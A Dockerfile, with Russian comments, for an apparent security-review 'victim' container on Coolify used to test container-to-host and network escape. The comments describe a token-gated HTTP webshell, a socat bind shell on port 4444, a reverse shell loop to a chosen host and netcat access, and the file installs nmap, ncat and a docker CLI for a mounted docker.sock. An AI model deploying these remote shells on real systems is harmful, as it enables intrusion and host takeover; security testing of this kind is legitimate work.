# coolify-secreview: контейнер-"жертва" для проверки container -> host/network escape
#
# Режимы (через env в Coolify, все работают параллельно):
#   webshell            - HTTP exec на ${WS_PORT:-8080} (основной канал, через
#                         домен приложения/Traefik): /run?t=$WS_TOKEN&c=CMD
#   (default)           - bind shell (socat, pipes) на 0.0.0.0:${BIND_PORT:-4444}
#   RHOST + RPORT       - reverse shell loop на указанный хост:порт (фоном)
#   BIND_PORT=0         - без bind shell
#
# Деплой: Coolify -> New Resource -> (git repo) -> Build Pack: Dockerfile
# Для доступа снаружи: Ports Mappings "4444:4444", далее `nc <vps-ip> 4444`

FROM debian:bookworm-slim

ENV DEBIAN_FRONTEND=noninteractive

# Инструментарий для enum внутри контейнера
RUN apt-get update && apt-get install -y --no-install-recommends \
      bash socat netcat-openbsd ncat nmap \
      curl wget jq ca-certificates \
      iproute2 iputils-ping dnsutils net-tools \
      procps libcap2-bin \
      redis-tools postgresql-client \
      python3 \
    && rm -rf /var/lib/apt/lists/*

# Статический docker CLI - нужен, если в контейнер вдруг замаунчен docker.sock
RUN set -e; \
    arch="$(dpkg --print-architecture)"; \
    case "$arch" in amd64) da=x86_64 ;; arm64) da=aarch64 ;; *) da="" ;; esac; \
    if [ -n "$da" ]; then \
      curl -fsSL "https://download.docker.com/linux/static/stable/${da}/docker-27.0.3.tgz" \
        | tar -xz -C /usr/local/bin --strip-components=1 docker/docker; \
    fi

COPY entrypoint.sh /entrypoint.sh
COPY enum.sh /opt/enum.sh
COPY webshell.py /opt/webshell.py
RUN chmod +x /entrypoint.sh /opt/enum.sh /opt/webshell.py

ENTRYPOINT ["/entrypoint.sh"]
